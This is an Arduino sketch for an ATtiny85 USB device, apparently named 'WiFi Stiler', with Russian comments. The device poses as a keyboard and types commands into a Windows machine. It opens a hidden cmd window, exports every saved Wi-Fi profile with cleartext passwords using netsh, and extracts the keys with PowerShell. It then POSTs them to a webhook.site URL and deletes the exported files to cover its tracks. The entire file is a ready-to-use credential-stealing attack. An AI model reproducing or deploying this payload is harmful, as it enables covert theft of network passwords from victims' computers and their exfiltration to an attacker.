//Attiny85_WiFi_Stiler_byDarkLon3r
#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //Запуск "Выполнить"
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd %appdata%");
  DigiKeyboard.delay(300); 
  DigiKeyboard.println("netsh wlan export profile key=clear");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Select-String -Path *.xml -Pattern 'keyMaterial' > wifi_pass"); //Получить пароли вай фай
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<Your unique URL> -Method POST -InFile wifi_pass"); //Отправка на веб хук паролей вай фай
  DigiKeyboard.delay(1000);  
  DigiKeyboard.println("del wifi_* /s /f /q");
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);  
  digitalWrite(1, HIGH); //Вклюить led 
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
